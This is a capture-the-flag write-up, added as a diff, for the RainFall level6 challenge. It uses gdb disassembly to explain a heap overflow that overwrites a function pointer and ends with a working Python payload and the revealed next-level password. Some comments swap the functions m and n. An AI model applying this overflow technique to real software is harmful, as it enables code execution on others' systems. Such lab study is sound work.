@@ -1,0 +1,125 @@
+# Disassembly of main function :
+
+(gdb) disas
+Dump of assembler code for function main:
+	0x0804847c <+0>:	push   %ebp
+	0x0804847d <+1>:	mov    %esp,%ebp
+	0x0804847f <+3>:	and    $0xfffffff0,%esp
+	0x08048482 <+6>:	sub    $0x20,%esp
+	0x08048485 <+9>:	movl   $0x40,(%esp)
+	0x0804848c <+16>:	call   0x8048350 <malloc@plt>
+	0x08048491 <+21>:	mov    %eax,0x1c(%esp)
+	0x08048495 <+25>:	movl   $0x4,(%esp)
+	0x0804849c <+32>:	call   0x8048350 <malloc@plt>
+	0x080484a1 <+37>:	mov    %eax,0x18(%esp)
+	0x080484a5 <+41>:	mov    $0x8048468,%edx
+	0x080484aa <+46>:	mov    0x18(%esp),%eax
+	0x080484ae <+50>:	mov    %edx,(%eax)
+	0x080484b0 <+52>:	mov    0xc(%ebp),%eax
+	0x080484b3 <+55>:	add    $0x4,%eax
+	0x080484b6 <+58>:	mov    (%eax),%eax
+	0x080484b8 <+60>:	mov    %eax,%edx
+	0x080484ba <+62>:	mov    0x1c(%esp),%eax
+	0x080484be <+66>:	mov    %edx,0x4(%esp)
+	0x080484c2 <+70>:	mov    %eax,(%esp)
+	0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
+	0x080484ca <+78>:	mov    0x18(%esp),%eax
+	0x080484ce <+82>:	mov    (%eax),%eax
+	0x080484d0 <+84>:	call   *%eax
+	0x080484d2 <+86>:	leave
+	0x080484d3 <+87>:	ret
+
+# The address returned by the first call to malloc at 0x1c($esp) is : 0x804a008
+# By looking at the previous word in the heap, we get :
+
+(gdb) x/x $esp[0x1c] - 4
+0x804a004:	0x00000049
+
+# As you can see in the disassembly, a value is moved on the stack right before
+# the first call to malloc :
+
+     0x08048485 <+9>:    movl   $0x40,(%esp)
+
+# We can deduce that the area allocated for the first malloc is 64 bytes wide,
+# + 8 bytes for the header (0x40 + 0x8, the remaining one bit is metadata for
+# the free function).
+# Using the same logic, we can deduce that the size of the second malloc is 4
+# bytes, since the value is pushed on the stack before the next call to malloc.
+
+# The list of functions gives another hint as to what we need to be doing here :
+
+All defined functions:
+
+Non-debugging symbols:
+[...]
+0x08048454  n
+0x08048468  m
+0x0804847c  main
+
+# A quick check at each symbol's dissassembly gives :
+
+(gdb) disas n
+Dump of assembler code for function n:
+	0x08048454 <+0>:	push   %ebp
+	0x08048455 <+1>:	mov    %esp,%ebp
+	0x08048457 <+3>:	sub    $0x18,%esp
+	0x0804845a <+6>:	movl   $0x80485b0,(%esp)
+	0x08048461 <+13>:	call   0x8048370 <system@plt>
+	0x08048466 <+18>:	leave
+	0x08048467 <+19>:	ret
+End of assembler dump.
+
+(gdb) x/s 0x80485b0
+0x80485b0:	 "/bin/cat /home/user/level7/.pass"
+
+(gdb) disas m
+Dump of assembler code for function m:
+	0x08048468 <+0>:	push   %ebp
+	0x08048469 <+1>:	mov    %esp,%ebp
+	0x0804846b <+3>:	sub    $0x18,%esp
+	0x0804846e <+6>:	movl   $0x80485d1,(%esp)
+	0x08048475 <+13>:	call   0x8048360 <puts@plt>
+	0x0804847a <+18>:	leave
+	0x0804847b <+19>:	ret
+End of assembler dump.
+
+(gdb) x/s 0x80485d1
+0x80485d1:	 "Nope"
+
+# We can see that the address of the first instruction of m is the one moved
+# in the $edx register, in the main function :
+
+0x080484a5 <+41>:	mov    $0x8048468,%edx | 0x08048468 <+0>:	push   %ebp
+
+# Then, a call to strcpy is made with two args, one located at 0xc($ebp)
+# (which corresponds to argv) and one located at 0x1c($esp) :
+
+	0x080484b0 <+52>:	mov    0xc(%ebp),%eax <== 
+	0x080484b3 <+55>:	add    $0x4,%eax 	  <== %eax = ++argv
+	0x080484b6 <+58>:	mov    (%eax),%eax <== %eax = *argv
+	0x080484b8 <+60>:	mov    %eax,%edx <== %edx = %eax
+	0x080484ba <+62>:	mov    0x1c(%esp),%eax <== %eax = malloc(0x40)
+	0x080484be <+66>:	mov    %edx,0x4(%esp) <== 0x4(%esp) = *argv[1];
+	0x080484c2 <+70>:	mov    %eax,(%esp) <== (%esp) = %eax
+	0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
+
+# Finally, a call to a certain function is made (n, as we as seen previously) :
+
+	0x080484a1 <+37>:	mov    %eax,0x18(%esp) <== move ret value by malloc at 0x18(%esp)
+	0x080484a5 <+41>:	mov    $0x8048468,%edx <== move address of n in %edx
+	0x080484aa <+46>:	mov    0x18(%esp),%eax <== move address on stack in eax
+	0x080484ae <+50>:	mov    %edx,(%eax) <== move address of n in malloc(4)
+	[...]
+	0x080484ca <+78>:	mov    0x18(%esp),%eax <== retrieve address of malloc(4)
+	0x080484ce <+82>:	mov    (%eax),%eax <== dereference address of malloc(4) into eax
+	0x080484d0 <+84>:	call   *%eax <== call n()
+
+# With all of this information, the answer becomes obvious. We need to pass a string
+# through argv[1] that will overflow the region pointed to by malloc(0x40) into the 
+# region pointed to by malloc(4), containing the address of n and overwrite it
+# with the address of m :
+
+level6@RainFall:~$ ./level6 $(python -c "import struct;
+> target = struct.pack('I', 0x08048454)
+> print 'A' * 72 + target")
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
